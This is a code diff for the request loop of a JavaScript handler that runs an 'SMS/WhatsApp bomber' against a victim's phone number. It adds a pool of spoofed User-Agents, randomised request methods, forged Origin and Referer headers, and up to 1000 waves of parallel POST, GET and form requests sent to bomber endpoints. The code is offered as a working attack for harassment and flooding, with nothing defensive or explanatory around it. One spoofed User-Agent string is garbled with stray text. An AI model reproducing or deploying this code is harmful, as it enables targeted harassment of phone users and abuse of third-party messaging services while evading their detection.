@@ -15,83 +15,88 @@ export default async function handler(req, res) {
     'https://shadowx-sms-bomber.onrender.com/'
   ];
 
+  // 2. Advanced Identity Spoofing (User-Agent Pool)
+  const userAgents = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E1 مش (KHTML, like Gecko) Version/16.5 Mobile/15E1'
+  ];
+
   const runAttack = async () => {
-    // Ultimate mode e 1000+ attack simulation
     const totalWaves = isUltimate ? 1000 : amount; 
     const delay = isUltimate ? 300 : 1000; 
 
     for (let i = 0; i < totalWaves; i++) {
-      // Protibar loop e amra multiple methods try korbo
       const attackPromises = targetLinks.map(async (baseUrl) => {
         
-        // --- METHOD 1: POST with Massive Payload (JSON) ---
-        const postPayload = async () => {
-          try {
+        // --- CHAOS ENGINE: Randomizing Method, Headers, and Payload ---
+        const randomMethod = Math.random() > 0.5 ? 'POST' : 'GET';
+        const randomUA = userAgents[Math.floor(Math.random() * userAgents.length)];
+        
+        const payload = {
+          number: cleanNumber,
+          phone: cleanNumber,
+          target: cleanNumber,
+          mobile: cleanNumber,
+          amount: 1,
+          count: 1,
+          country: "BD",
+          service: "whatsapp",
+          msg: "Ultimate Attack",
+          auth: "true",
+          token: Math.random().toString(36).substring(7),
+          is_active: true,
+          method: "sms"
+        };
+
+        try {
+          // Method 1: POST with JSON (Standard API)
+          if (randomMethod === 'POST') {
             await fetch(baseUrl, {
               method: 'POST',
               headers: { 
                 'Content-Type': 'application/json',
                 'Accept': 'application/json, text/plain, */*',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+                'User-Agent': randomUA,
                 'X-Requested-With': 'XMLHttpRequest',
                 'Origin': baseUrl,
                 'Referer': baseUrl,
               },
-              body: JSON.stringify({
-                number: cleanNumber,
-                phone: cleanNumber,
-                target: cleanNumber,
-                amount: 1,
-                count: 1,
-                country: "BD",
-                service: "whatsapp",
-                msg: "Ultimate Attack",
-                auth: "true",
-                token: Math.random().toString(36).substring(7),
-                is_active: true
-              }),
+              body: JSON.stringify(payload),
               mode: 'no-cors'
             });
-          } catch (e) {}
-        };
-
-        // --- METHOD 2: GET with Query Parameters (URL Injection) ---
-        const getPayload = async () => {
-          const urlWithParams = `${baseUrl}?number=${cleanNumber}&amount=1&country=BD&service=whatsapp&phone=${cleanNumber}&target=${cleanNumber}`;
-          try {
+          } else {
+            // Method 2: GET with Query Params (URL Injection)
+            const urlWithParams = `${baseUrl}?number=${cleanNumber}&amount=1&country=BD&service=whatsapp&phone=${cleanNumber}`;
             await fetch(urlWithParams, {
               method: 'GET',
               mode: 'no-cors',
-              headers: {
-                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
-              }
+              headers: { 'User-Agent': randomUA }
             });
-          } catch (e) {}
-        };
+          }
 
-        // --- METHOD 3: Form Data Simulation (X-WWW-FORM-URLENCODED) ---
-        const formDataPayload = async () => {
-          try {
-            const formData = new URLSearchParams();
-            formData.append('number', cleanNumber);
-            formData.append('amount', '1');
-            formData.append('country', 'BD');
+          // Method 3: Form Data (Legacy API)
+          const formData = new URLSearchParams();
+          formData.append('number', cleanNumber);
+          formData.append('amount', '1');
+          formData.append('country', 'BD');
 
-            await fetch(baseUrl, {
-              method: 'POST',
-              headers: { 
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
-              },
-              body: formData.toString(),
-              mode: 'no-cors'
-            });
-          } catch (e) {}
-        };
+          await fetch(baseUrl, {
+            method: 'POST',
+            headers: { 
+              'Content-Type': 'application/x-www-form-urlencoded',
+              'User-Agent': randomUA,
+              'Origin': baseUrl,
+              'Referer': baseUrl,
+            },
+            body: formData.toString(),
+            mode: 'no-cors'
+          });
 
-        // Ekhon amra sob method eksathe execute korbo (Parallel Attack)
-        return Promise.all([postPayload(), getPayload(), formDataPayload()]);
-
+        } catch (err) {
+          console.error(`[Wave ${i}] Error: ${err.message}`);
+        }
       });
 
       await Promise.all(attackPromises);
@@ -105,4 +110,4 @@ export default async function handler(req, res) {
     success: true, 
     message: isUltimate ? "ULTIMATE ATTACK INITIATED! 🚀" : "ATTACK STARTED! 🔥" 
   });
-                }
+}
